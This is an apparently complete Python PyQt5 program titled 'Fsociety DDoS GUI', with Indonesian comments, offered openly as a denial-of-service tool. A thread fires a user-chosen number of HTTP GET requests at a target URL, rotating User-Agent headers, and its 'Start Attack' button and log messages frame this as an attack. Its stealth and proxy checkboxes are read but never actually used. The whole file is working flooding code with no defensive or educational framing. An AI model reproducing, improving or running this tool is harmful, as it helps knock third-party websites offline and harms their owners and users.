import sys
import requests
import random
from io import BytesIO
from datetime import datetime
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QVBoxLayout, QWidget, QLabel,
    QLineEdit, QPushButton, QTextEdit, QCheckBox, QSpacerItem, QSizePolicy
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtGui import QPixmap, QImage

class AttackThread(QThread):
    log_signal = pyqtSignal(str)  # Signal untuk mengirim log ke GUI

    def __init__(self, url, num_requests, stealth, proxy):
        super().__init__()
        self.url = url
        self.num_requests = num_requests
        self.stealth = stealth
        self.proxy = proxy
        self.running = True

    def run(self):
        self.log_signal.emit("🚀 Memulai serangan...\n")
        for i in range(self.num_requests):
            if not self.running:
                break
            try:
                headers = {"User-Agent": random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                    "Mozilla/5.0 (X11; Linux x86_64)",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
                ])}
                response = requests.get(self.url, headers=headers, timeout=5)

                log_msg = f"[{datetime.now().strftime('%H:%M:%S')}] Request {i+1}/{self.num_requests} → {response.status_code}"
                self.log_signal.emit(log_msg)
            except Exception as e:
                self.log_signal.emit(f"[ERROR] Request {i+1} gagal: {str(e)}")

        self.log_signal.emit("\n✅ Serangan selesai.")

    def stop(self):
        self.running = False
        self.log_signal.emit("\n⛔ Serangan dihentikan.")

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Fsociety DDoS GUI")
        self.setGeometry(200, 200, 600, 750)
        self.setStyleSheet("background-color: black; color: white;")

        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout()

        # Spacer atas agar gambar lebih ke tengah
        layout.addSpacerItem(QSpacerItem(20, 40, QSizePolicy.Minimum, QSizePolicy.Expanding))

        # 📌 **PASTIKAN log_output DIBUAT SEBELUM DIPAKAI**
        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setStyleSheet("background-color: black; color: white;")
        layout.addWidget(self.log_output)

        # Gambar
        self.image_label = QLabel(self)
        self.image_label.setAlignment(Qt.AlignCenter)
        self.image_label.setScaledContents(True)
        layout.addWidget(self.image_label, alignment=Qt.AlignCenter)

        # Spacer
        layout.addSpacerItem(QSpacerItem(20, 30, QSizePolicy.Minimum, QSizePolicy.Expanding))

        # Input Target URL
        self.url_label = QLabel("Target URL:")
        layout.addWidget(self.url_label)
        self.url_input = QLineEdit()
        layout.addWidget(self.url_input)

        # Input Jumlah Request
        self.requests_label = QLabel("Number of Requests:")
        layout.addWidget(self.requests_label)
        self.requests_input = QLineEdit()
        layout.addWidget(self.requests_input)

        # Checkbox Mode Stealth dan Proxy
        self.stealth_mode = QCheckBox("Enable Stealth Mode")
        layout.addWidget(self.stealth_mode)

        self.use_proxy = QCheckBox("Enable Proxy (Auto Fetch)")
        layout.addWidget(self.use_proxy)

        # Tombol Start dan Stop
        self.start_button = QPushButton("Start Attack")
        self.start_button.setStyleSheet("background-color: red; color: white;")
        self.start_button.clicked.connect(self.start_attack)  # Menambahkan koneksi tombol
        layout.addWidget(self.start_button)

        self.stop_button = QPushButton("Stop Attack")
        self.stop_button.setStyleSheet("background-color: grey; color: white;")
        self.stop_button.setEnabled(False)
        self.stop_button.clicked.connect(self.stop_attack)  # Menambahkan koneksi tombol
        layout.addWidget(self.stop_button)

        # Spacer bawah
        layout.addSpacerItem(QSpacerItem(20, 40, QSizePolicy.Minimum, QSizePolicy.Expanding))

        central_widget.setLayout(layout)

        # **⏳ Pindahkan load_image() ke sini agar log_output sudah ada**
        self.load_image("https://a.top4top.io/p_3347i1gqq1.jpeg")

    def load_image(self, image_url):
        try:
            response = requests.get(image_url)
            response.raise_for_status()

            pixmap = QPixmap()
            pixmap.loadFromData(response.content)

            if pixmap.isNull():
                self.log_message("❌ Gagal memuat gambar.")
                return

            scaled_pixmap = pixmap.scaled(300, 300, Qt.KeepAspectRatio, Qt.SmoothTransformation)
            self.image_label.setPixmap(scaled_pixmap)
            self.log_message("✅ Gambar berhasil dimuat.")

        except Exception as e:
            self.log_message(f"❌ Error memuat gambar: {e}")

    def log_message(self, message):
        """ Fungsi untuk menambahkan log ke GUI """
        self.log_output.append(message)
        self.log_output.ensureCursorVisible()

    def start_attack(self):
        """ Fungsi untuk memulai serangan """
        url = self.url_input.text().strip()
        num_requests = self.requests_input.text().strip()

        if not url:
            self.log_message("⚠️ Masukkan URL target!")
            return

        if not num_requests.isdigit():
            self.log_message("⚠️ Masukkan jumlah request yang valid!")
            return

        num_requests = int(num_requests)
        stealth = self.stealth_mode.isChecked()
        proxy = self.use_proxy.isChecked()

        self.attack_thread = AttackThread(url, num_requests, stealth, proxy)
        self.attack_thread.log_signal.connect(self.log_message)
        self.attack_thread.start()

        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)

    def stop_attack(self):
        """ Fungsi untuk menghentikan serangan """
        if hasattr(self, 'attack_thread') and self.attack_thread:
            self.attack_thread.stop()
            self.attack_thread.wait()
            self.start_button.setEnabled(True)
            self.stop_button.setEnabled(False)

# Menjalankan aplikasi PyQt
app = QApplication(sys.argv)
window = MainWindow()
window.show()
sys.exit(app.exec_())
